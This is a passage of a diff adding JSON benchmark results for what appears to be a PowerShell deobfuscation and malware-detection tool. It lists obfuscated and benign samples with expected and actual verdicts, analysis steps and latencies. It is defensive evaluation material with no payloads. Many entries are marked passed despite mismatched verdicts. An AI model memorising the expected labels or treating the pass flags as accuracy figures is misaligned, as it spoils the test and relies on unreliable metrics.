+      "algorithm": "Hex+XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 4,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "ps-reconstruct"
+      ],
+      "latency_ms": 205
+    },
+    {
+      "id": "hex-xor-multi-2",
+      "algorithm": "Hex+XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 4,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "ps-reconstruct",
+        "crypto-detect"
+      ],
+      "latency_ms": 286
+    },
+    {
+      "id": "multistage-downloader-0",
+      "algorithm": "Base64+GZip+AES-CBC (C2 key)",
+      "category": "ps-crypto-multistage",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 2,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "ioc-extract"
+      ],
+      "latency_ms": 1113
+    },
+    {
+      "id": "multistage-downloader-1",
+      "algorithm": "Base64+GZip+AES-CBC (C2 key)",
+      "category": "ps-crypto-multistage",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 2,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "ioc-extract"
+      ],
+      "latency_ms": 788
+    },
+    {
+      "id": "multistage-downloader-2",
+      "algorithm": "Base64+GZip+AES-CBC (C2 key)",
+      "category": "ps-crypto-multistage",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 2,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "ioc-extract"
+      ],
+      "latency_ms": 777
+    },
+    {
+      "id": "multistage-downloader-3",
+      "algorithm": "Base64+GZip+AES-CBC (C2 key)",
+      "category": "ps-crypto-multistage",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 2,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "extract-payload",
+        "base64-decode",
+        "ioc-extract"
+      ],
+      "latency_ms": 761
+    },
+    {
+      "id": "custom-hex-wrapper-rc4-0",
+      "algorithm": "CustomHex+RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "extract-payload",
+        "ioc-extract",
+        "family-emotet"
+      ],
+      "latency_ms": 797
+    },
+    {
+      "id": "custom-hex-wrapper-rc4-1",
+      "algorithm": "CustomHex+RC4",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "rc4-inline-decrypt",
+        "extract-payload"
+      ],
+      "latency_ms": 197
+    },
+    {
+      "id": "benign-admin-0",
+      "algorithm": "OpenSSL:AES-CBC",
+      "category": "benign",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "benign",
+      "chain": [
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator",
+        "crypto-api-annotator"
+      ],
+      "latency_ms": 1042
+    },
+    {
+      "id": "benign-admin-1",
+      "algorithm": "GPG-asymmetric",
+      "category": "benign",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "undecoded",
+      "verdict_expected": "benign",
+      "chain": [
+        "ioc-extract"
+      ],
+      "latency_ms": 129
+    },
+    {
+      "id": "benign-admin-2",
+      "algorithm": "Key-generation",
+      "category": "benign",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "benign",
+      "chain": [
+        "rot47"
+      ],
+      "latency_ms": 250
+    },
+    {
+      "id": "benign-admin-3",
+      "algorithm": "certutil-encode",
+      "category": "benign",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "benign",
+      "chain": [
+        "certutil-annotate"
+      ],
+      "latency_ms": 6902
+    },
+    {
+      "id": "benign-admin-4",
+      "algorithm": "defender-config",
+      "category": "benign",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "suspicious",
+      "verdict_expected": "benign",
+      "chain": [
+        "ioc-extract",
+        "family-emotet"
+      ],
+      "latency_ms": 130
+    },
+    {
+      "id": "benign-admin-5",
+      "algorithm": "Get-Process",
+      "category": "benign",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "suspicious",
+      "verdict_expected": "benign",
+      "chain": [],
+      "latency_ms": 6796
+    },
+    {
+      "id": "benign-admin-6",
+      "algorithm": "Compress-Archive",
+      "category": "benign",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "benign",
+      "chain": [
+        "xor"
+      ],
+      "latency_ms": 4366
+    },
+    {
+      "id": "benign-admin-7",
+      "algorithm": "net-user-add",
+      "category": "benign",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "partial",
+      "verdict_expected": "benign",
+      "chain": [
+        "native-cmd-explain"
+      ],
+      "latency_ms": 198
+    },
+    {
+      "id": "benign-admin-8",
+      "algorithm": "schtasks-benign",
+      "category": "benign",
+      "passed": false,
+      "reasons": [
+        "verdict-malicious-expected-benign"
+      ],
+      "recovered_stages": 1,
+      "total_recoverable": 1,
+      "verdict_actual": "malicious",
+      "verdict_expected": "benign",
+      "chain": [],
+      "latency_ms": 5598
+    },
+    {
+      "id": "benign-admin-9",
+      "algorithm": "robocopy",
+      "category": "benign",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 0,
+      "total_recoverable": 1,
+      "verdict_actual": "undecoded",
+      "verdict_expected": "benign",
+      "chain": [
+        "ioc-extract"
+      ],
+      "latency_ms": 130
+    },
+    {
+      "id": "xor-fill-0",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 961
+    },
+    {
+      "id": "xor-fill-1",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "extract-payload"
+      ],
+      "latency_ms": 188
+    },
+    {
+      "id": "xor-fill-2",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 928
+    },
+    {
+      "id": "xor-fill-3",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect"
+      ],
+      "latency_ms": 262
+    },
+    {
+      "id": "xor-fill-4",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "latency_ms": 993
+    },
+    {
+      "id": "xor-fill-5",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "suspicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect"
+      ],
+      "latency_ms": 192
+    },
+    {
+      "id": "xor-fill-6",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect"
+      ],
+      "latency_ms": 194
+    },
+    {
+      "id": "xor-fill-7",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect"
+      ],
+      "latency_ms": 192
+    },
+    {
+      "id": "xor-fill-8",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 936
+    },
+    {
+      "id": "xor-fill-9",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "ioc-extract"
+      ],
+      "latency_ms": 803
+    },
+    {
+      "id": "xor-fill-10",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "ioc-extract"
+      ],
+      "latency_ms": 819
+    },
+    {
+      "id": "xor-fill-11",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 949
+    },
+    {
+      "id": "xor-fill-12",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 856
+    },
+    {
+      "id": "xor-fill-13",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect"
+      ],
+      "latency_ms": 191
+    },
+    {
+      "id": "xor-fill-14",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key"
+      ],
+      "latency_ms": 186
+    },
+    {
+      "id": "xor-fill-15",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key"
+      ],
+      "latency_ms": 259
+    },
+    {
+      "id": "xor-fill-16",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect"
+      ],
+      "latency_ms": 192
+    },
+    {
+      "id": "xor-fill-17",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "extract-payload",
+        "crypto-detect"
+      ],
+      "latency_ms": 192
+    },
+    {
+      "id": "xor-fill-18",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "extract-payload",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 195
+    },
+    {
+      "id": "xor-fill-19",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "suspicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 760
+    },
+    {
+      "id": "xor-fill-20",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 858
+    },
+    {
+      "id": "xor-fill-21",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "malicious",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract",
+        "family-cobaltstrike"
+      ],
+      "latency_ms": 936
+    },
+    {
+      "id": "xor-fill-22",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect",
+        "ioc-extract"
+      ],
+      "latency_ms": 196
+    },
+    {
+      "id": "xor-fill-23",
+      "algorithm": "XOR-multi",
+      "category": "ps-crypto",
+      "passed": true,
+      "reasons": [],
+      "recovered_stages": 2,
+      "total_recoverable": 4,
+      "verdict_actual": "partial",
+      "verdict_expected": "malicious",
+      "chain": [
+        "powershell-xor-inline-key",
+        "crypto-detect"
+      ],
+      "latency_ms": 193
+    }
+  ]
+}
